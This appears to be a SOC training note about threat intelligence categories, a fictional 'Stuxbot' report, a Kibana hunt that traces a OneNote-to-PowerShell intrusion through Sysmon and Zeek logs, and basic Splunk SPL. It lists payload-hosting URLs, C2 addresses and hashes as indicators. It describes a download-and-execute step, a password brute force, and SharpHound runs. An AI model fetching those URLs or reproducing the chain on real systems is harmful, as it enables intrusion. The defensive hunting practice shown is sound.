Threat Intelligence (Predictive): The primary aim here is to anticipate the adversary's moves, ascertain their targets, and discern their methods of information acquisition. The adversary has a specific objective, and as a team involved in Threat Intelligence, our mission is to predict:

- The location of the intended attack
- The timing of the attack
- The operational strategies the adversary will employ
- The ultimate objectives of the adversary

Threat Hunting (Reactive and Proactive): Yes, the two terms are opposites, but they encapsulate the essence of Threat Hunting. An initiating event or incident, whether it occurs within our network or in a network of a similar industry, prompts our team to launch an operation to ascertain whether an adversary is present in the network, or if one was present and evaded detection.

Ultimately, Threat Intelligence and Threat Hunting bolster each other, strengthening our organization's overall network defense posture. As our Threat Intelligence team analyzes adversary activities and develops comprehensive adversary profiles, this information can be shared with our Threat Hunting analysts to inform their operations. Conversely, the findings from Threat Hunting operations can equip our Threat Intelligence analysts with additional data to refine their intelligence and enhance the accuracy of their predictions.


**Criteria Of Cyber Threat Intelligence**

What truly makes Cyber Threat Intelligence (CTI) valuable? What issues does it resolve? As discussed earlier, for CTI to be effective, it must be Actionable, Timely, Relevant, and Accurate. These four elements form the foundation of robust CTI that ultimately provides visibility into adversary operations. Additionally, well-constructed CTI brings forth secondary benefits, such as:

- Understanding of threats to our organization and partner entities
- Potential insights into our organization's network
- Enhanced awareness of potential problems that may have gone unnoticed

Furthermore, from a leadership standpoint, high-quality CTI aids in fulfilling the business objective of minimizing risk as much as possible. As intelligence about an adversary targeting our business is gathered and analyzed, it empowers leadership to adequately assess the risk, formulate a contingency action plan if an incident occurs, and ultimately frame the problem and disseminate the information in a coherent and meaningful way.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/a2b38f4e-93d1-476b-a493-5f08a886c719)


As this information is compiled, it transforms into intelligence. This intelligence can then be classified into three different categories, each having varying degrees of relevance for different teams within our organization. These categories are:

- Strategic Intelligence
- Operational Intelligence
- Tactical Intelligence

In the diagram below, the ideal intersection is right at the core. At this convergence juncture, the Cyber Threat Intelligence (CTI) analyst is equipped to offer the most comprehensive and detailed portrait of the adversary and their modus operandi.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/f4786f72-8bd3-40eb-b12e-921159a8adf3)


Strategic Intelligence is characterized by:

- Being consumed by C-suite executives, VPs, and other company leaders
- Aiming to align intelligence directly with company risks to inform decisions
- Providing an overview of the adversary's operations over time
- Mapping TTPs and Modus Operandi (MO) of the adversary
- Striving to answer the Who? and Why?
- Example: A report containing strategic intelligence might outline the threat posed by APT28 (also known as Fancy Bear), a nation-state actor linked to the Russian government. This report could cover the group's past campaigns, its motivations (such as political espionage), targets (like governments, military, and security organizations), and long-term strategies. The report might also explore how the group adapts its tactics and tools over time, based on historical data and the geopolitical context.

Operational Intelligence is characterized by:

- Also including TTPs of an adversary (similar to strategic intelligence)
- Providing information on adversary campaigns
- Offering more detail than what's found in strategic intelligence reports
- Being produced for mid-level management personnel
- Working towards answering the How? and Where?
- Example: A report containing operational intelligence can provide detailed analysis of a ransomware campaign conducted by the REvil group. It would include how the group gains initial access (like through phishing or exploiting vulnerabilities), its lateral movement tactics (such as credential dumping and exploiting Windows admin tools), and its methods of executing the ransomware payload (maybe after hours to maximize damage and encrypt as many systems as possible).

Tactical Intelligence is characterized by:

- Delivering immediate actionable information
- Being provided to network defenders for swift action
- Including technical details on attacks that have occurred or could occur in the near future
- Example: A report containing tactical intelligence could include specific IP addresses, URLs, or domains linked to the REvil command and control servers, hashes of known REvil ransomware samples, specific file paths, registry keys, or mutexes associated with REvil, or even distinctive strings within the ransomware code. This type of information can be directly used by security technologies and incident responders to detect, prevent, and respond to specific threats.

It's crucial to understand that there's a degree of overlap among these three types of intelligence. That's why we represent the intelligence in a Venn diagram. Tactical intelligence contributes to forming an operational picture and a strategic overview. The converse is also true.


### How To Go Through A Tactical Threat Intelligence Report


Interpreting threat intelligence reports loaded with tactical intelligence and Indicators of Compromise (IOCs) is a task that requires a structured methodology to optimize our responsiveness as SOC analysts or threat hunters. Let's delve into a procedural, in-depth process using a theoretical scenario involving a threat intelligence report on an elaborate Emotet malware campaign:

- Comprehending the Report's Scope and Narrative: The initial phase of interpreting the report involves comprehending its broader context. Suppose our report elucidates an ongoing Emotet campaign directed towards businesses in our sector. The report may offer macro-level insights about the attackers' objectives and the types of entities in their crosshairs. By grasping the narrative, we can assess the pertinence of the threat to our own business.

- Spotting and Classifying the IOCs: Tactical intelligence typically encompasses a list of IOCs tied to the threat. In the context of our Emotet scenario, these might include IP addresses linked to command-and-control (C2) servers, file hashes of the Emotet payloads, email addresses or subject lines leveraged in phishing campaigns, URLs of deceptive websites, or distinct Registry alterations by the malware. We should partition these IOCs into categories for more comprehensible understanding and actionable results: Network-based IOCs (IPs, domains), Host-based IOCs (file hashes, registry keys), and Email-based IOCs (email addresses, subject lines). Furthermore, IOCs could also contain Mutex names generated by the malware, SSL certificate hashes, specific API calls enacted by the malware, or even patterns in network traffic (such as specific User-Agents, HTTP headers, or DNS request patterns). Moreover, IOCs can be augmented with supplementary data. For instance, IP addresses can be supplemented with geolocation data, WHOIS information, or associated domains.


- Comprehending the Attack's Lifecycle: The report will likely depict the Tactics, Techniques, and Procedures (TTPs) deployed by the attackers, correspondingly mapped to the MITRE ATT&CK framework. For the Emotet campaign, it might commence with a spear-phishing email (Initial Access), proceed to execute the payload (Execution), establish persistence (Persistence), execute defense evasion tactics (Defense Evasion), and ultimately exfiltrate data or deploy secondary payloads (Command and Control). Comprehending this lifecycle aids us in forecasting the attacker's moves and formulating an effective response.

- Analysis and Validation of IOCs: Not all IOCs hold the same utility or accuracy. We need to authenticate them, typically by cross-referencing with additional threat intelligence sources or databases such as VirusTotal or AlienVault's OTX. We also need to contemplate the age of IOCs. Older ones may not be as pertinent if the attacker has modified their infrastructure or tactics. Moreover, contextualizing IOCs is critical for their correct interpretation. For example, an IP address employed as a C2 server may also host legitimate websites due to IP sharing in cloud environments. Analysts should also consider the source's reliability and whether the IOC has been whitelisted in the past. Ultimately, understanding the false positive rate is crucial to avoid alert fatigue.


- Incorporating the IOCs into our Security Infrastructure: Once authenticated, we can integrate these IOCs into our security solutions. This might involve updating firewall rules with malicious IP addresses or domains, incorporating file hashes into our endpoint detection and response (EDR) solution, or creating new IDS/IPS signatures. For email-based IOCs, we can update our email security gateway or anti-spam solution. When implementing IOCs, we should consider the potential impact on business operations. For example, blocking an IP address might affect a business-critical service. In such cases, alerting rather than blocking might be more appropriate. Additionally, all changes should be documented and approved following change management procedures to maintain system integrity and avoid unintentional disruptions.

- Proactive Threat Hunting: Equipped with insights from the report, we can proactively hunt for signs of the Emotet threat in our environment. This might involve searching logs for network connections to the C2 servers, scanning endpoints for the identified file hashes, or checking email logs for the phishing email indicators. Threat hunting shouldn't be limited to searching for IOCs. We should also look for broader signs of TTPs described in the report. For instance, Emotet often employs PowerShell for execution and evasion. Therefore, we might hunt for suspicious PowerShell activity, even if it doesn't directly match an IOC. This approach aids in detecting variants of the threat not covered by the specific IOCs in the report.

- Continuous Monitoring and Learning: After implementing the IOCs, we must continually monitor our environment for any hits. Any detection should trigger a predefined incident response process. Furthermore, we should utilize the information gleaned from the report to enhance our security posture. This could involve user education around the phishing tactics employed by the Emotet group or improving our detection rules to catch the specific evasion techniques employed by this malware. While we should unquestionably learn from each report, we should also contribute back to the threat intelligence community. If we discover new IOCs or TTPs, these should be shared with threat intelligence platforms and ISACs/ISAOs (Information Sharing and Analysis Centers/Organizations) to aid other organizations in defending against the threat.

This meticulous, step-by-step process, while tailored to our Emotet example, can be applied to any threat intelligence report containing tactical intelligence and IOCs. The secret is to be systematic, comprehensive, and proactive in our approach to maximize the value we derive from these reports.


### Hunting For Stuxbot

**Threat Intelligence Report: Stuxbot**

The present Threat Intelligence report underlines the immediate menace posed by the organized cybercrime collective known as "Stuxbot". The group initiated its phishing campaigns earlier this year and operates with a broad scope, seizing upon opportunities as they arise, without any specific targeting strategy – their motto seems to be anyone, anytime. The primary motivation behind their actions appears to be espionage, as there have been no indications of them exfiltrating sensitive blueprints, proprietary business information, or seeking financial gain through methods such as ransomware or blackmail.

- Platforms in the Crosshairs: Microsoft Windows
- Threatened Entities: Windows Users
- Potential Impact: Complete takeover of the victim's computer / Domain escalation
- Risk Level: Critical

The group primarily leverages opportunistic-phishing for initial access, exploiting data from social media, past breaches (e.g., databases of email addresses), and corporate websites. There is scant evidence suggesting spear-phishing against specific individuals.

The document compiles all known Tactics Techniques and Procedures (TTPs) and Indicators of Compromise (IOCs) linked to the group, which are currently under continuous refinement. This preliminary sketch is confidential and meant exclusively for our partners, who are strongly advised to conduct scans of their infrastructures to spot potential successful breaches at the earliest possible stage.

In summary, the attack sequence for the initially compromised device can be laid out as follows:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/f648c977-3c7c-4d06-b97c-f2334201e654)

## Initial Breach

The phishing email is relatively rudimentary, with the malware posing as an invoice file. Here's an example of an actual phishing email that includes a link leading to a OneNote file:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/fdd6e07a-3c25-4694-ad48-c6a3d7b5eba0)


Our forensic investigation into these attacks revealed that the link directs to a OneNote file, which has consistently been hosted on a file hosting service (e.g., Mega.io or similar platforms).

This OneNote file masquerades as an invoice featuring a 'HIDDEN' button that triggers an embedded batch file. This batch file, in turn, fetches PowerShell scripts, representing stage 0 of the malicious payload.

### RAT Characteristics

The RAT deployed in these attacks is modular, implying that it can be augmented with an infinite range of capabilities. While only a few features are accessible once the RAT is staged, we have noted the use of tools that capture screen dumps, execute Mimikatz, provide an interactive CMD shell on compromised machines, and so forth.

### Persistence

All persistence mechanisms utilized to date have involved an EXE file deposited on the disk.

**Lateral Movement**

So far, we have identified two distinct methods for lateral movement:

- Leveraging the original, Microsoft-signed PsExec
- Using WinRM

**Indicators of Compromise (IOCs)**

The following provides a comprehensive inventory of all identified IOCs to this point.

**OneNote File:**

```
https://transfer.sh/get/kNxU7/invoice.one
https://mega.io/dl9o1Dz/invoice.one
```

**Staging Entity (PowerShell Script):**

```
https://pastebin.com/raw/AvHtdKb2
https://pastebin.com/raw/gj58DKz
```
**Command and Control (C&C) Nodes:**

```
91.90.213.14:443
103.248.70.64:443
141.98.6.59:443
```

**Cryptographic Hashes of Involved Files (SHA256):**

```
226A723FFB4A91D9950A8B266167C5B354AB0DB1DC225578494917FE53867EF2
C346077DAD0342592DB753FE2AB36D2F9F1C76E55CF8556FE5CDA92897E99C7E
018D37CBD3878258C29DB3BC3F2988B6AE688843801B9ABC28E6151141AB66D4
```

### Hunting For Stuxbot With The Elastic Stack

Navigate to the bottom of this section and click on Click here to spawn the target system!

Now, navigate to http://[Target IP]:5601, click on the side navigation toggle, and click on "Discover". Then, click on the calendar icon, specify "last 15 years", and click on "Apply".

Please also specify a Europe/Copenhagen timezone, through the following link http://[Target IP]:5601/app/management/kibana/settings.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/063f8d35-a5ef-4c37-a472-67d1f7f6df3f)


The Available Data

The cybersecurity strategy implemented is predicated on the utilization of the Elastic stack as a SIEM solution. Through the "Discover" functionality we can see logs from multiple sources. These sources include:

- Windows audit logs (categorized under the index pattern windows*)
- System Monitor (Sysmon) logs (also falling under the index pattern windows*, more about Sysmon here)
- PowerShell logs (indexed under windows* as well, more about PowerShell logs here)
- Zeek logs, a network security monitoring tool (classified under the index pattern zeek*)

Our available threat intelligence stems from March 2023, hence it's imperative that our Kibana setup scans logs dating back at least to this time frame. Our "windows" index contains around 118,975 logs, while the "zeek" index houses approximately 332,261 logs.


**The Environment**

Our organization is relatively small, with about 200 employees primarily engaged in online marketing activities, thus our IT resource requirement is minimal. Office applications are the primary software in use, with Gmail serving as our standard email provider, accessed through a web browser. Microsoft Edge is the default browser on our company laptops. Remote technical support is provided through TeamViewer, and all our company devices are managed via Active Directory Group Policy Objects (GPOs). We're considering a transition to Microsoft Intune for endpoint management as part of an upcoming upgrade from Windows 10 to Windows 11.

**The Task**

Our task centers around a threat intelligence report concerning a malicious software known as "Stuxbot". We're expected to use the provided Indicators of Compromise (IOCs) to investigate whether there are any signs of compromise in our organization.


**The Hunt**

```
The sequence of hunting activities is premised on the hypothesis of a successful phishing email delivering a malicious OneNote file. If our hypothesis had been the successful execution of a binary with a hash matching one from the threat intelligence report, we would have undertaken a different sequence of activities.
```
The report indicates that initial compromises all took place via "invoice.one" files. Despite this, we must continue to conduct searches on other IOCs as the threat actors may have introduced different delivery techniques between the time the report was created and the present. Back to the "invoice.one" files, a comprehensive search can be initiated based on Sysmon Event ID 15 (FileCreateStreamHash), which represents a browser file download event. We're assuming that a potentially malicious OneNote file was downloaded from Gmail, our organization's email provider.

**Our search query should be the following.**

**Related fields: winlog.event_id or event.code and file.name**

```
event.code:15 AND file.name:*invoice.one
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/d351e095-c8a4-4961-b04b-14f5fd917d19)


While this development could imply serious implications, it's not yet confirmed if this file is the same one mentioned in the report. Further, signs of execution have not been probed. If we extend the event log to display its complete content, it'll reveal that MSEdge was the application (as indicated by process.name or process.executable) used to download the file, which was stored in the Downloads folder of an employee named Bob.

The timestamp to note is: 
```
March 26, 2023 @ 22:05:47
```

We can corroborate this information by examining Sysmon Event ID 11 (File create) and the "invoice.one" file name. This method is especially effective when browsers aren't involved in the file download process. The query is similar to the previous one, but the asterisk is at the end as the file name includes only the filename with an additional Zone Identifier, likely indicating that the file originated from the internet.

Related fields: winlog.event_id or event.code and file.name

```
event.code:11 AND file.name:invoice.one*
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/f2dc9abf-53e1-47ae-8042-88e658cda3f6)


It's relatively easy to deduce that the machine which reported the "invoice.one" file has the hostname WS001 (check the host.hostname or host.name fields of the Sysmon Event ID 11 event we were just looking at) and an IP address of 192.168.28.130, which can be confirmed by checking any network connection event (Sysmon Event ID 3) from this machine (execute the following query event.code:3 AND host.hostname:WS001 and check the source.ip field).

If we inspect network connections leveraging Sysmon Event ID 3 (Network connection) around the time this file was downloaded, we'll find that Sysmon has no entries. This is a common configuration to avoid capturing network connections created by browsers, which could lead to an overwhelming volume of logs, particularly those related to our email provider.

This is where Zeek logs prove invaluable. We should filter and examine the DNS queries that Zeek has captured from WS001 during the interval from 22:05:00 to 22:05:48, when the file was downloaded.

Our Zeek query will search for a source IP matching 192.168.28.130, and since we're querying about DNS queries, we'll only pick logs that have something in the dns.question.name field. Note that this will return a lot of common noise, like google.com, etc., so it's necessary to filter that out. Here's the query and some filters.

```
Related fields: source.ip and dns.question.name
```

```
source.ip:192.168.28.130 AND dns.question.name:*
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/9ebd4f33-3367-4cc9-85ce-67c452968087)


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c0caa893-c1ea-442b-a4d1-296e2fc12d9f)


As part of our search process, since we're interested in DNS names, we'd like to display only the dns.question.name field in the result table. Please note the specified time March 26th 2023 @ 22:05:00 to March 26th 2023 @ 22:05:48.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/bc68e4b4-50a0-4ea5-bb5f-d19c306c72f5)


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/666e3e6c-4f16-435a-b00d-8d30c96dbd43)


Scrolling down the table of entries, we observe the following activities.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/fff5a581-46d7-4b56-8add-42adea9cfe5e)


From this data, we infer that the user accessed Google Mail, followed by interaction with "file.io", a known hosting provider. Subsequently, Microsoft Defender SmartScreen initiated a file scan, typically triggered when a file is downloaded via Microsoft Edge. Expanding the log entry for file.io reveals the returned IP addresses (dns.answers.data or dns.resolved_ip or zeek.dns.answers fields) as follows.

34.197.10.85, 3.213.216.16

Now, if we run a search for any connections to these IP addresses during the same timeframe as the DNS query, it leads to the following findings.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/f04c4e71-4d2b-49b8-9745-ebb96e13c582)

This information corroborates that a user, Bob, successfully downloaded the file "invoice.one" from the hosting provider "file.io".

At this juncture, we have two choices: we can either cross-reference the data with the Threat Intel report to identify overlapping information within our environment, or we can conduct an Incident Response (IR)-like investigation to trace the sequence of events post the OneNote file download. We choose to proceed with the latter approach, tracking the subsequent activities.

Hypothetically, if "invoice.one" was accessed, it would be opened with the OneNote application. So, the following query will flag the event, if it transpired. Note: The time frame we specified previously should be removed, setting it to, say, 15 years again. The dns.question.name column should also be removed.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/e6b4533c-61c6-442c-b911-9973b82be25a)


```
Related fields: winlog.event_id or event.code and process.command_line
```

```
event.code:1 AND process.command_line:*invoice.one*
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/5bcea20b-baec-463e-a6f6-a29862f71367)


Indeed, we find that the OneNote file was accessed shortly after its download, with a delay of roughly 6 seconds. Now, with OneNote.exe in operation and the file open, we can speculate that it either contains a malicious link or a malevolent file attachment. In either case, OneNote.exe will initiate either a browser or a malicious file. Therefore, we should scrutinize any new processes where OneNote.exe is the parent process. The corresponding query is the following. Sysmon Event ID 1 (Process creation) is utilized.

```
Related fields: winlog.event_id or event.code and process.parent.name
```

```
event.code:1 AND process.parent.name:"ONENOTE.EXE"
```
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/a1517fbc-e30e-44dc-8c93-36a1d1ebed54)


The results of this query present three hits. However, one of these (the bottom one) falls outside the relevant time frame and can be dismissed. Evaluating the other two results:

- The middle entry documents (when expanded) a new process, OneNoteM.exe, which is a component of OneNote and assists in launching files.
- The top entry reveals "cmd.exe" in operation, executing a file named "invoice.bat". Here is the view upon expanding the log.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/cdd5d39f-42d2-4071-8596-8a960545e22c)


Now we can establish a connection between "OneNote.exe", the suspicious "invoice.one", and the execution of "cmd.exe" that initiates "invoice.bat" from a temporary location (highly likely due to its attachment inside the OneNote file). The question now is, has this batch script instigated anything else? Let's search if a parent process with a command line argument pointing to the batch file has spawned any child processes with the following query.


```
Related fields: winlog.event_id or event.code and process.parent.command_line
```
```
event.code:1 AND process.parent.command_line:*invoice.bat*
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/87eccce7-f3be-43e8-86da-41f2a034891c)

This query returns a single result: the initiation of PowerShell, and the arguments passed to it appear conspicuously suspicious (note that we have added process.name, process.args, and process.pid as columns)! A command to download and execute content from Pastebin, an open text hosting provider! We can try to access and see if the content, which the script attempted to download, is still available (by default, it won't expire!).

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/3681b7c3-856f-4110-b468-01dbb2e6b3fb)


Indeed, it is! This is referred to in the Threat Intelligence report, stating that a PowerShell Script from Pastebin was downloaded.

To figure out what PowerShell did, we can filter based on the process ID and name to get an overview of activities. Note that we have added the event.code field as a column.

```
Related fields: process.pid and process.name
```

```
process.pid:"9944" and process.name:"powershell.exe"
```
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/4f976742-337a-4a61-a59b-afb67d2638d3)


Immediately, we can observe intriguing output indicating file creation, attempted network connections, and some DNS resolutions leverarging Sysmon Event ID 22 (DNSEvent). By adding some additional informative fields (file.path, dns.question.name, and destination.ip ) as columns to that view, we can expand it.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/90a54dfa-9882-4426-b45d-bf3a79e560dc)


Now, this presents us with rich data on the activities. Ngrok was likely employed as C2 (to mask malicious traffic to a known domain). If we examine the connections above the DNS resolution for Ngrok, it points to the destination IP Address 443, implying that the traffic was encrypted.

The dropped EXE is likely intended for persistence. Its distinctive name should facilitate determining whether it was ever executed. It's important to note the timestamps – there is some time lapse between different activities, suggesting it's less likely to have been scripted but perhaps an actual human interaction took place (unless random sleep occurred between the executed actions). The final actions that this process points to are a DNS query for DC1 and connections to it.

Let's review Zeek data for information on the destination IP address 18.158.249.75 that we just discovered. Note that the source.ip, destination.ip, and destination.port fields were added as columns.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/67b2c9b6-46df-4997-8804-fb83786ac2b8)


Intriguingly, the activity seems to have extended into the subsequent day. The reason for the termination of the activity is unclear... Was there a change in C2 IP? Or did the attack simply halt? Upon inspecting DNS queries for "ngrok.io", we find that the returned IP (dns.answers.data) has indeed altered. Note that the dns.answers.data field was added as a column.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/20be976f-7b4f-475d-87a2-c5b349b13d09)

The newly discovered IP also indicates that connections continued consistently over the following days.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/4313ebec-7f5f-49cd-a119-8fd22003c989)


Thus, it's apparent that there is sustained network activity, and we can deduce that the C2 has been accessed continually. Now, as for the earlier uploaded executable file "default.exe" – did that ever execute? By probing the Sysmon logs for a process with that name, we can ascertain this. Note that the process.name, process.args, event.code, file.path, destination.ip, and dns.question.name fields were added as columns.

```
Related field: process.name
```
```
process.name:"default.exe"
```
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/7f2b4365-eed2-44ad-9f47-c99fdc5c0aff)


Indeed, it has been executed – we can instantly discern that the executable initiated DNS queries for Ngrok and established connections with the C2 IP addresses. It also uploaded two files "svchost.exe" and "SharpHound.exe". SharpHound is a recognized tool for diagramming Active Directory and identifying attack paths for escalation. As for svchost.exe, we're unsure – is it another malicious agent? The name implies it attempts to mimic the legitimate svchost file, which is part of the Windows Operating System.

If we scroll up there's further activity from this executable, including the uploading of "payload.exe", a VBS file, and repeated uploads of "svchost.exe".

At this juncture, we're left with one question: did SharpHound execute? Did the attacker acquire information about Active Directory? We can investigate this with the following query (since it was an on-disk executable file).

```
Related field: process.name
```
```
process.name:"SharpHound.exe"
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/7d9c58f6-b03b-4727-8892-b14d03276a90)

Indeed, the tool appears to have been executed twice, roughly 2 minutes apart from each other.

It's vital to note that Sysmon has flagged "default.exe" with a file hash (process.hash.sha256 field) that aligns with one found in the Threat Intel report. This leads us to question whether this executable has been detected on other devices within the environment. Let's conduct a broad search. Note that the host.hostname field was added as a column.

```
Related field: process.hash.sha256
```
```
process.hash.sha256:018d37cbd3878258c29db3bc3f2988b6ae688843801b9abc28e6151141ab66d4
```
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/60ae664a-d5cf-4ab6-93a8-1b736b256dc1)

Files with this hash value have been found on WS001 and PKI, indicating that the attacker has also breached the PKI server at a minimum. It also appears that a backdoor file has been placed under the profile of user "svc-sql1", suggesting that this user's account is likely compromised.

Expanding the first instance of "default.exe" execution on PKI, we notice that the parent process was "PSEXESVC", a component of PSExec from SysInternals – a tool often used for executing commands remotely, frequently utilized for lateral movement in Active Directory breaches.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/9344c676-cf71-4f31-8e70-04930b146f57)


Further down the same log, we notice "svc-sql1" in the user.name field, thereby confirming the compromise of this user.

How was the password of "svc-sql1" compromised? The only plausible explanation from the available data so far is potentially the earlier uploaded PowerShell script, seemingly designed for Password Bruteforcing. We know that this was uploaded on WS001, so we can check for any successful or failed password attempts from that machine, excluding those for Bob, the user of that machine (and the machine itself).

```
Related fields: winlog.event_id or event.code, winlog.event_data.LogonType, and source.ip
```
```
(event.code:4624 OR event.code:4625) AND winlog.event_data.LogonType:3 AND source.ip:192.168.28.130
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/1d19f67c-fbdf-47b2-8983-90f86126ea74)

The results are quite intriguing – two failed attempts for the administrator account, roughly around the time when the initial suspicious activity was detected. Subsequently, there were numerous successful logon attempts for "svc-sql1". It appears they attempted to crack the administrator's password but failed. However, two days later on the 28th, we observe successful attempts with svc-sql1.

At this stage, we have amassed a significant amount of information to present and initiate a comprehensive incident response, in accordance with company policies.

### Introduction To Splunk & SPL

**What Is Splunk?**

Splunk is a highly scalable, versatile, and robust data analytics software solution known for its ability to ingest, index, analyze, and visualize massive amounts of machine data. Splunk has the capability to drive a wide range of initiatives, encompassing cybersecurity, compliance, data pipelines, IT monitoring, observability, as well as overall IT and business management.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/b44ba757-c018-4848-b855-65e5867403ee)

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/150a55f4-d98b-4bed-83ad-8a530265c0cb)


Splunk's (Splunk Enterprise) architecture consists of several layers that work together to collect, index, search, analyze, and visualize data. The architecture can be divided into the following main components:

- Forwarders: Forwarders are responsible for data collection. They gather machine data from various sources and forward it to the indexers. The types of forwarders used in Splunk are:
- Universal Forwarder (UF): This is a lightweight agent that collects data and forwards it to the Splunk indexers without any preprocessing. Universal Forwarders are individual software packages that can be easily installed on remote sources without significantly affecting network or host performance.
- Heavy Forwarder (HF): This agent serves the purpose of collecting data from remote sources, especially for intensive data aggregation assignments involving sources like firewalls or data routing/filtering points. According to Splexicon, heavy forwarders stand out from other types of forwarders as they parse data before forwarding, allowing them to route data based on specific criteria such as event source or type. They can also index data locally while simultaneously forwarding it to another indexer. Typically, Heavy Forwarders are deployed as dedicated "data collection nodes" for API/scripted data access, and they exclusively support Splunk Enterprise.
- Please note that there are HTTP Event Collectors (HECs) available for directly collecting data from applications in a scalable manner. HECs operate by using token-based JSON or raw API methods. In this process, data is sent directly to the Indexer level for further processing.

- Indexers: The indexers receive data from the forwarders, organize it, and store it in indexes. While indexing data, the indexers generate sets of directories categorized by age, wherein each directory hold compressed raw data and corresponding indexes that point to the raw data. They also process search queries from users and return results.

- Search Heads: Search heads coordinate search jobs, dispatching them to the indexers and merging the results. They also provide an interface for users to interact with Splunk. On Search Heads, Knowledge Objects can be crafted to extract supplementary fields and manipulate data without modifying the original index data. It is important to mention that Search Heads also offer various tools to enrich the search experience, including reports, dashboards, and visualizations.

- Deployment Server: It manages the configuration for forwarders, distributing apps and updates.

- Cluster Master: The cluster master coordinates the activities of indexers in a clustered environment, ensuring data replication and search affinity.

- License Master: It manages the licensing details of the Splunk platform.

Splunk's key components include:

- Splunk Web Interface: This is the graphical interface through which users can interact with Splunk, carrying out tasks like searching, creating alerts, dashboards, and reports.
- Search Processing Language (SPL): The query language for Splunk, allowing users to search, filter, and manipulate the indexed data.
- Apps and Add-ons: Apps provide specific functionalities within Splunk, while add-ons extend capabilities or integrate with other systems. Splunk Apps enable the coexistence of multiple workspaces on a single Splunk instance, catering to different use cases and user roles. These ready-made apps can be found on Splunkbase, providing additional functionalities and pre-configured solutions. Splunk Technology Add-ons serve as an abstraction layer for data collection methods. They often include relevant field extractions, allowing for schema-on-the-fly functionality. Additionally, Technology Add-ons encompass pertinent configuration files (props/transforms) and supporting scripts or binaries. A Splunk App, on the other hand, can be seen as a comprehensive solution that typically utilizes one or more Technology Add-ons to enhance its capabilities.
- Knowledge Objects: These include fields, tags, event types, lookups, macros, data models, and alerts that enhance the data in Splunk, making it easier to search and analyze.


**Splunk As A SIEM Solution**

When it comes to cybersecurity, Splunk can play a crucial role as a log management solution, but its true value lies in its analytics-driven Security Information and Event Management (SIEM) capabilities. Splunk as a SIEM solution can aid in real-time and historical data analysis, cybersecurity monitoring, incident response, and threat hunting. Moreover, it empowers organizations to enhance their detection capabilities by leveraging User Behavior Analytics.

As discussed, Splunk Processing Language (SPL) is a language containing over a hundred commands, functions, arguments, and clauses. It's the backbone of data analysis in Splunk, used for searching, filtering, transforming, and visualizing data.

Let's assume that main is an index containing Windows Security and Sysmon logs, among others.

1. Basic Searching

The most fundamental aspect of SPL is searching. By default, a search returns all events, but it can be narrowed down with keywords, boolean operators, comparison operators, and wildcard characters. For instance, a search for error would return all events containing that word.

Boolean operators AND, OR, and NOT are used for more specific queries.

The search command is typically implicit at the start of each SPL query and is not usually written out. However, here's an example using explicit search syntax:

```
search index="main" "UNKNOWN"
```

By specifying the index as main, the query narrows down the search to only the events stored in the main index. The term UNKNOWN is then used as a keyword to filter and retrieve events that include this specific term.

Note: Wildcards (*) can replace any number of characters in searches and field values. Example (implicit search syntax):


```
index="main" "*UNKNOWN*"
```

This SPL query will search within the main index for events that contain the term UNKNOWN anywhere in the event data.

2. Fields and Comparison Operators

Splunk automatically identifies certain data as fields (like source, sourcetype, host, EventCode, etc.), and users can manually define additional fields. These fields can be used with comparison operators (=, !=, <, >, <=, >=) for more precise searches. Example:

```
index="main" EventCode!=1
```

This SPL (Splunk Processing Language) query is used to search within the main index for events that do not have an EventCode value of 1.

3. The fields command

The fields command specifies which fields should be included or excluded in the search results. Example:

```
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | fields - User
```

After retrieving all process creation events from the main index, the fields command excludes the User field from the search results. Thus, the results will contain all fields normally found in the Sysmon Event ID 1 logs, except for the user that initiated the process. Please note that utilizing sourcetype restricts the scope exclusively to Sysmon event logs.


> [!WARNING]
> MORE about Splunk is missing.


# Active Directory ATTACKS & DEFENSE

### What is Active Directory?

